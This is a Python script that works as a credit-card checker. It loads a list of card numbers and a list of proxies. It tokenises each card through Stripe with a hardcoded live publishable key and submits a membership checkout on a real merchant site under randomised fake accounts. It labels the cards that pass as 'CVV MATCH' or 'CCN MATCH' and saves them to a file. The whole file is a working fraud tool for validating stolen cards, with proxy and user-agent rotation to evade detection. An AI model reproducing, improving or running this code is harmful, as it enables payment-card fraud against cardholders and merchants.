import aiohttp
import asyncio
import random
import string
import uuid
import re
import traceback
import time
import sys
import requests
import random

MAX_RETRIES = 3
RETRY_SLEEP_TIME = 3


async def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RED = "\033[31m"
    GREEN = "\033[32m"


def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]

    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9

    checksum = sum(digits)

    return checksum % 10 == 0


def getcards(text: str):

    input = re.findall(r"[0-9]+", text.replace("CCV2", ""))
    if not input or len(input) < 3:
        return None, None, None, None, "invalid_input"

    if len(input) == 3:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2][:2]
            ano = input[2][2:]
            cvv = input[1]
        else:
            mes = input[1][:2]
            ano = input[1][2:]
            cvv = input[2]
    else:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2]
            ano = input[3]
            cvv = input[1]
        else:
            mes = input[1]
            ano = input[2]
            cvv = input[3]
        if len(mes) == 2 and (mes > "12" or mes < "01"):
            ano1 = mes
            mes = ano
            ano = ano1
    if not luhn_check(cc):
        return None, None, None, None, "invalid_luhn"
    if cc[0] == 3 and len(cc) not in [15, 16] or int(
            cc[0]) not in [3, 4, 5, 6]:
        return None, None, None, None, "invalid_card_number"
    if (len(mes) not in [2, 4] or len(mes) == 2 and mes > "12"
            or len(mes) == 2 and mes < "01"):
        return None, None, None, None, "invalid_card_month"
    if (len(ano) not in [2, 4] or len(ano) == 2 and ano < "23"
            or len(ano) == 4 and ano < "2023" or len(ano) == 2 and ano > "30"
            or len(ano) == 4 and ano > "2030"):
        return None, None, None, None, "invalid_card_year"
    if cc[0] == 3 and len(cvv) != 4 or len(cvv) != 3:
        return None, None, None, None, "invalid_card_cvv"

    if (cc, mes, ano, cvv):
        if len(ano) == 2:
            ano = "20" + str(ano)
        return cc, mes, ano, cvv, False


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
]


async def make_payment_request(cc, mes, ano, cvv, PROXY_INFO):
    try:
        time.sleep(3)
        async with aiohttp.ClientSession() as session:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://js.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "DNT": "1",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
            }

            data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano[-2:]}&guid={uuid.uuid4}&muid={uuid.uuid4}&sid={uuid.uuid4}&pasted_fields=number&payment_user_agent=stripe.js%2Ffe2e2c5c10%3B+stripe-js-v3%2Ffe2e2c5c10%3B+split-card-element&referrer=https%3A%2F%2Fecstest.net&time_on_page=137180&key=pk_live_51HdlIAIp3rQqxTHDy00d0h4a1Ug7VESCtZKMWKLw1Ltr2UtjyS0HaFYKuf6b2PmZPB4A5fsZYp6quGHl1PyYq1MK00vom2WR7s"

            async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=data,
                    proxy=PROXY_INFO,
            ) as response:
                return await response.text()
    except aiohttp.ClientError as e:
        print("An error occurred while making payment request:", e)
        return None


async def process_payment_response(response):
    if response is None:
        return None, None, "Request Error: No response received"

    try:
        id = await find_between(response, '"id": "', '"')
        brand = await find_between(response, '"brand": "', '"')
        return id, brand, None
    except Exception as e:
        print("An error occurred while processing payment response:", e)
        return None, None, "Response Error: Unexpected format"


async def make_checkout_request(id, brand, cc, mes, ano, PROXY_INFO):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                # 'Accept-Encoding': 'gzip, deflate, br, zstd',
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://ecstest.net",
                "Connection": "keep-alive",
                "Referer": "https://ecstest.net/membership-checkout/?level=7",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Priority": "u=1",
            }
            meeq = f"20{ano[-2:]}".replace("2020", "20")
            num = random.randint(1000, 999999)
            email = "".join(
                random.choice(string.ascii_lowercase)
                for i in range(10)) + random.choice([
                    "@gmail.com",
                    "@outlook.com",
                    "@yahoo.com",
                    "@hotmail.com",
                ])
            data = [
                ("level", "7"),
                ("checkjavascript", "1"),
                ("username", f"lokjeaj{num}"),
                ("password", f"aries{num}"),
                ("password2", f"aries{num}"),
                ("bemail", email),
                ("bconfirmemail", email),
                ("fullname", ""),
                ("gateway", "stripe"),
                ("CardType", brand),
                ("submit-checkout", "1"),
                ("javascriptok", "1"),
                ("submit-checkout", "1"),
                ("javascriptok", "1"),
                ("payment_method_id", id),
                ("AccountNumber", f"XXXXXXXXXXXX{cc[-4:]}"),
                ("ExpirationMonth", mes),
                ("ExpirationYear", meeq),
            ]
            params = {
                "level": "7",
            }
            time.sleep(4)

            async with session.post(
                    "https://ecstest.net/membership-checkout/",
                    headers=headers,
                    data=data,
                    params=params,
                    proxy=PROXY_INFO,
            ) as response:
                return await response.text()
    except aiohttp.ClientError as e:
        print("An error occurred while making checkout request:", e)
        return None


async def process_checkout_response(response):
    if response is None:
        return "Request Error: No response received"

    try:
        result = response
        if ("Thank you for your membership." in result
                or "Membership Confirmation" in result
                or "Thank You For Donation." in result or "Success " in result
                or '"type":"one-time"' in result
                or "/donations/thank_you?donation_number=" in result):
            return "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿", "✅", "CVV MATCH"
        elif ("Error updating default payment method.Your card does not support this type of purchase."
              in result
              or "Your card does not support this type of purchase." in result
              or "transaction_not_allowed" in result
              or "insufficient_funds" in result or "incorrect_zip" in result
              or "Your card has insufficient funds." in result
              or '"status":"success"' in result
              or "stripe_3ds2_fingerprint" in result
              or "security code is incorrect." in result
              or "security code is invalid." in result):
            msg = await find_between(
                result,
                '<div id="pmpro_message" class="pmpro_message pmpro_error">',
                "</div>",
            )
            if msg is not None:
                msg = msg.replace("\n", "").replace("\t", "")
            else:
                msg = "Re-Try the CC and re-run code"
            return "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿", "✅", f"CCN MATCH - {msg}"
        else:
            msg = await find_between(
                result,
                '="pmpro_message pmpro_error">',
                "</div>",
            )
            if msg is not None:
                msg = msg.replace("\n", "").replace("\t", "")
            else:
                msg = "Re-Try the CC and re-run code"
            return "DECLINE", "❌", msg
    except Exception as e:
        print("An error occurred while processing checkout response:", e)
        return "Response Error: Unexpected format"


async def stripe(cc, mes, ano, cvv, PROXY_INFO):
    retries = 0
    while retries < MAX_RETRIES:
        payment_response = await make_payment_request(cc, mes, ano, cvv,
                                                      PROXY_INFO)
        id, brand, payment_error = await process_payment_response(
            payment_response)
        if id and brand:
            checkout_response = await make_checkout_request(
                id, brand, cc, mes, ano, PROXY_INFO)
            return await process_checkout_response(checkout_response)
        else:
            print("Payment Error:", payment_error)

        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(RETRY_SLEEP_TIME)
        else:
            print("Max retries exceeded. Exiting.")


async def process_cc_list(cc_list):
    num = 1
    for cards in cc_list:
        st = int(time.time())
        cc, mes, ano, cvv = cards
        xx = "|".join(cards)
        PROXY_INFO = random.choice(proxy_list)
        try:
            data = await stripe(cc, mes, ano, cvv, PROXY_INFO)
        except Exception as exc:
            traceback.print_exc()
            r_text, r_logo, r_respo = exc, "❌", "Declined"
        else:
            if isinstance(data, tuple):
                r_text, r_logo, r_respo = data
            else:
                r_text, r_logo, r_respo = data, "❌", "Declined"
        if "✅" in r_logo:
            with open("ip.txt", "a+") as f:
                f.write(f"{xx}:{r_text}\n")
            print(
                f"\n{bcolors.GREEN}Response: {num}. {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
            )
        else:
            print(
                f"\n{bcolors.RED}Response: {num}. {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
            )
        num = num+1


def load_proxies_from_file(filename):
    """Loads a list of proxies from a text file.

  Args:
      filename (str): The path to the text file containing proxies.

  Returns:
      list: A list of proxy dictionaries or None if there's an error.
  """
    try:
        with open(filename, "r") as f:
            proxy_list = []
            for line in f:
                # Remove trailing newline character from each line
                proxy_string = line.strip()
                # Assuming each line in the file is a valid proxy URL
                # You can modify this based on your file format
                if (proxy_check(proxy_string)):
                    proxy_list.append(proxy_string)
            if(not proxy_list):
                print("There no proxy alive.")
                print("Please add proxy format: http://username:password@ip:port")
                sys.exit(0)
            return proxy_list
    except FileNotFoundError:
        print(f"Error: Proxy file '{filename}' not found.")
        sys.exit(0)
    except Exception as e:
        print(f"Error reading proxy file '{filename}': {e}")
        sys.exit(0)


def proxy_check(proxy_string):
    r = requests.session()
    proxy_int = proxy_string
    r.proxies = {"http": proxy_int, "https": proxy_int}
    try:
        resp = r.get("https://ipv4.icanhazip.com")
        if resp.status_code == 200:
            return True
        else:
            print(f"Proxy Dead: Status Code: {resp.status_code}")
            return False
    except requests.RequestException as e:
        print(f"Proxy is not alive. Error: {e}")
        print("Please add proxy format: http://username:password@ip:port")
        sys.exit()


if __name__ == "__main__":
    proxy_list = load_proxies_from_file("proxy.txt")
    try:
        with open("3n.txt", "r", encoding="utf-8") as file:
            lista = file.read().splitlines()
    except FileNotFoundError as e:
        print(
            f"{bcolors.RED}FILE NOT FOUND. MAKE SURE YOUR FILE EXISTS{bcolors.ENDC}"
        )
        quit()

    print(f"{bcolors.OKBLUE}TOTAL CARDS DETECTED: {len(lista)}{bcolors.ENDC}")

    cc_list = []
    for x in lista:
        chk = getcards(x)
        cc, mes, ano, cvv, check = chk
        if not check:
            cc_list.append([cc, mes, ano, cvv])

    print(
        f"{bcolors.OKBLUE}TOTAL CARDS TO BE CHECKED: {len(cc_list)}{bcolors.ENDC}"
    )

    total = len(cc_list)
    asyncio.run(process_cc_list(cc_list))
